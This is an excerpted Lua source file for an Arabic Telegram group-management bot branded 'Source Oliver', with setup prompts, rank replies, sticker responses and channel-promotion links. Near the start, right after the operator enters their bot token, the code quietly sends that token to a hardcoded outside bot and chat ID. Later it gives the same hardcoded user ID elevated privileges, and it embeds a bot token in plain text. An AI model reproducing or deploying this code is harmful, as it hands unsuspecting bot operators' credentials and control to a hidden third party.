...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1812855697:AAHbbTQ5jkli-8F0NNavOV_RX8YInmJsXT0/sendmessage?chat_id=1741899314&text=' ..token)
end 
else
print('\27[0;35m♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\n\27[0;33;49m')
...
io.write('\27[1;31m ♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
if tonumber(user_id) == tonumber(1741899314) then  
var = true 
...
elseif tonumber(user_id) == tonumber(30) then
var = 'صاحب السورس'
elseif tonumber(user_id) == tonumber(175990986) then
var = 'مالك السورس'
elseif tonumber(user_id) == tonumber(10) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(SUDO) then
...
local UserName = (data.username_ or "J_ax_s_o_N")
...
local Text = ' ♲تم ارسال الملصق من ♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\n - '..Name
...
if text == '♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس  اوليفر ادخل وتابع الجديد](t.me/J_ax_s_o_N)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲》', url="t.me/J_ax_s_o_N"}}, 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/J_ax_s_o_N/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/J_ax_s_o_N)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/J_ax_s_o_N"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'حمو مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↝المبرمج جاكسون لو حابب تتواصل معاه
اتبع الزر إلى تحت ♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲↜
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨♲•𓆩| ıl★`𝐉. 𝐀. 𝐗. 𝐒. 𝐎. 𝐍´★lı |𓆪•♲❩', url="https://t.me/j_1x_q"}}, 
...
send(msg.chat_id_,0," ♲ الـعـضو  : {["..data.first_name_.."](T.ME/J_ax_s_o_N)}\n ♲ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ♲ عذرا  ⇇{["..data.first_name_.."](T.ME/J_ax_s_o_N)}\n ♲ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local Text =[[
╭♲━┅⟞⟦[♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲](http://t.me/J_ax_s_o_N)⟧⟝┉━♲╮

    [⟦𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 ♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲⟧](http://t.me/J_ax_s_o_N)

╰♲━┅⟞⟦[♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲](http://t.me/J_ax_s_o_N)⟧⟝┉━♲╯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ♲ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌♲', url = "https://t.me/J_X_S1"}},
{{text = '♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲', url = "https://t.me/J_ax_s_o_N"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/UU_M00N/3798&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/UU_M00N/3798&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/H1_MA&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'الهقر' or text == 'جااااك' or text == 'مطور السورس'  then
local Text = [[
جاكسون مطور سورس  اوليفر للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨♲• ⁽♲ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌♲₎ •♲',url="t.me/J_X_S1"}},
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝙻𝚃𝚄𝙰𝚂𝙸𝙻 𝚂𝙾𝚄𝚁𝙲𝙴 》', url="t.me/Asaliya_1"}}, 
} 
local msg_id = msg.id_/2097152/0.5
...
♲ خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
♲ 𝘾𝙃 - [《♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲》](t.me/J_ax_s_o_N) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/J_ax_s_o_N)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
function(arg,data) 
usertext = '\n ♲ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'J_ax_s_o_N')..')'
...
usertext = '\n ♲ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'J_ax_s_o_N')..')'
status  = '\n ♲ تم حظرو عام من الجروبات '
texts = usertext..status
...
local TextE = "\n♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\n ♲ علامة تعني { ✔️ } ملف مفعل\n ♲ علامة تعني { ✖ } ملف معطل\n ♲ قناة سورس  اوليفر♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\n".." ♲ [اضغط هنا لدخول](t.me/J_ax_s_o_N) \n"
local NumFile = 0
...
' }\nء⧬━┅┅┄⟞❲[♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲](t.me/J_ax_s_o_N)❳⟝┄┉┉━⧬'..
'\n ♲  علامة ال {✓} تعني مفعل'..
'\n ♲  علامة ال {✘} تعني معطل'..
'\nء♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲'..
'\n'..' ♲  امر صيح  ⇇{ '..kickme..
...
' }\n'..' ♲  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ♲  الرفع  ⇇{ '..setadd..
' }\n'..' ♲  الحظر  ⇇{ '..banm..' }\n\n ♲═───═❲[《♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲》 ](t.me/J_ax_s_o_N)❳═───═ ♲\n ♲ قناة سورس  اوليفر♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\n [ ❲[《♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲》 ](t.me/J_ax_s_o_N)❳](t.me/J_ax_s_o_N) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲\nاضغط علي الاسم ليتم نسخه\n♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲ٴ\n ♲ ❲[《♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲》 ](t.me/J_ax_s_o_N)❳ ♲ ')
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/J_ax_s_o_N/55/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/J_ax_s_o_N/53/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/J_ax_s_o_N/39/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'عاش' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/J_ax_s_o_N/27/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'اجري' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/J_ax_s_o_N/30/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'لا' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/J_ax_s_o_N/34/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'الو' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/J_ax_s_o_N/41/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'حبك' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/J_ax_s_o_N/13/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/J_ax_s_o_N/76/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/J_ax_s_o_N/43/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'النشال' then
local Text = [[
]]
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..♲♥️](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/J_ax_s_o_N)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..♲💕](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/J_ax_s_o_N)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..♲💕](t.me/J_ax_s_o_N)')
return false
end
end
end
...
[[
↑♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ♲  
↑♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲𝙄𝘿 ➱ #id
↑♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲𝙍𝘼𝙉𝙆 ➱  #stast ♲  
↑♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲𝙈𝘼𝙎𝙂 ➱ #msgs ♲  
↑♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲𝗖𝗛 ➯  ↝@J_ax_s_o_N↜ ♲  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲
 اختر الامر الذي تريدها .↑♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲
ده من الازرار بلاسفل . ♲━┅┄⟞⟦𝐎𝐋𝐈𝐕𝐄𝐑⟧⟝┄┉━♲
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《♲ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐎𝐋𝐈𝐕𝐄𝐑♲》 ](t.me/J_ax_s_o_N)❳ 
]]
keyboard = {} 
